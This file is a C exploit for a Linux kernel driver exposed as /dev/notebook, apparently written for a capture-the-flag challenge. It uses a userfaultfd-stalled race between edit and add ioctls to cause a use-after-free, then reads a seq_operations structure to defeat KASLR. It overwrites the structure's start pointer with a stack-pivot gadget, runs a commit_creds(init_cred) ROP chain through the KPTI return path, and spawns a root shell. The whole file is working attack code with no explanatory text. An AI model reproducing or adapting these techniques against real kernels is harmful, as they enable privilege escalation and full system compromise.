#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>

#define SINGLE_START 0xffffffff8128c230
size_t pop_rdi = 0xffffffff81007115; // pop rdi ; ret
size_t add_rsp_xx = 0xFFFFFFFF8127CDB2l; 
size_t swapgs_kpti = 0xFFFFFFFF81A00931;
size_t init_cred = 0xffffffff8225c940;
size_t commit_creds = 0xffffffff810a9b40;
size_t prepare_kernel_cred = 0xffffffff810a9ef0;

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

int fd;
struct note {
	size_t idx;
	size_t size;
	char* buf;
};

void add(size_t idx, size_t size, char* buf)
{
	struct note n = { .idx = idx, .size = size, .buf = buf };
	ioctl(fd, 0x100, &n);
}

void dele(size_t idx)
{
	struct note n = { .idx = idx };
	ioctl(fd, 0x200, &n);
}

void edit(size_t idx, size_t size, char* buf)
{
	struct note n = { .idx = idx, .size = size, .buf = buf };
	ioctl(fd, 0x300, &n);
}

void gift(char* buf)
{
	struct note n = { .buf = buf };
	ioctl(fd, 0x64, &n);
}

void register_userfaultfd(void* uffd_buf, pthread_t pthread_moniter, void* handler)
{
	int uffd;
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	
	uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);
	if (uffd == -1) err_exit("syscall for userfaultfd ERROR in register_userfaultfd func");
	
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) err_exit("ioctl for UFFDIO_API ERROR");

	uffdio_register.range.start = (unsigned long long)uffd_buf;
	uffdio_register.range.len = 0x1000;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) err_exit("ioctl for UFFDIO_REGISTER ERROR");
	
	int res = pthread_create(&pthread_moniter, NULL, handler, uffd);
	if (res == -1) err_exit("pthread_create ERROR in register_userfaultfd func");
}

char buf[0x30];
void handler(void* args)
{
	int uffd = (int)args;
	struct uffd_msg msg;
	struct uffdio_copy uffdio_copy;

	for (;;)
	{
		struct pollfd pollfd;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		int res = poll(&pollfd, 1, -1);
		if (res == -1) err_exit("ERROR on poll");
	
		int n = read(uffd, &msg, sizeof(msg));
		if (n == 0) err_exit("EOF on read uffd");	
		if (n == -1) err_exit("ERROR on read uffd");	
		
		sleep(10000);
		puts("userfault over");
		if (msg.event != UFFD_EVENT_PAGEFAULT) err_exit("No correct EVENT");
		
		uffdio_copy.src = buf;
		uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(0x1000 - 1);
		uffdio_copy.len = 0x20;
		uffdio_copy.mode = 0;
		uffdio_copy.copy = 0;
		if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) err_exit("ERROR in UFFDIO_COPY");
	}
}

sem_t sem_edit, sem_add;

void evil_edit(void* args)
{
	sem_wait(&sem_edit);
	info("evil_edit for construct UAF");
	edit(0, 0, args);
}

void evil_add(void* args)
{
	sem_wait(&sem_add);
	info("evil_add for fix the size");
	add(0, 0x20, args);
}

int seq_fd;
int main(int argc, char** argv, char** env)
{
	bind_core(0);
	
	size_t buf[0x300];
	char* uffd_buf;
	size_t kernel_offset;
	pthread_t moniter, pt_edit, pt_add;

	sem_init(&sem_edit, 0, 0);
	sem_init(&sem_add, 0, 0);

	fd = open("/dev/notebook", O_RDWR);
	add(0, 0x20, buf);
	
	uffd_buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	register_userfaultfd(uffd_buf, moniter, handler);	

	pthread_create(&pt_edit, NULL, evil_edit, uffd_buf);
	pthread_create(&pt_add, NULL, evil_add, uffd_buf);
	
	sem_post(&sem_edit);
	sleep(2);
	sem_post(&sem_add);
	sleep(2);

	seq_fd = open("/proc/self/stat", O_RDONLY);
	if (seq_fd < 0) err_exit("Failed to open /proc/self/stat");	

	read(fd, buf, 0);
	binary_dump("seq_operations", buf, 0x20);	
	kernel_offset = buf[0] - SINGLE_START;
	hexx("kernel_offset", kernel_offset);
	
	buf[0] = add_rsp_xx + kernel_offset;
	hexx("seq_operations->start", buf[0]);
	write(fd, buf, 0);
	
	pop_rdi += kernel_offset;
	init_cred += kernel_offset;
	commit_creds += kernel_offset;
	swapgs_kpti += kernel_offset;
	asm volatile(
	"mov r15, pop_rdi;"
	"mov r14, init_cred;"
	"mov r13, commit_creds;"
	"mov r12, swapgs_kpti;"
	"mov rbp, 0x55555555;"
	"mov rbx, 0x66666666;"
	"mov r11, 0x77777777;"
	"mov r10, 0x88888888;"
	"mov r9,  0x99999999;"
	"mov r8,  0xaaaaaaaa;"
	"xor rax, rax;"
	"mov rcx, 0xbbbbbbbb;"
	"mov rdx, 8;"
	"mov rsi, buf;"
	"mov rdi, seq_fd;"
	"syscall;"
	);
	
	hexx("UID", getuid());
	system("/bin/sh");
	
        return 0;
}
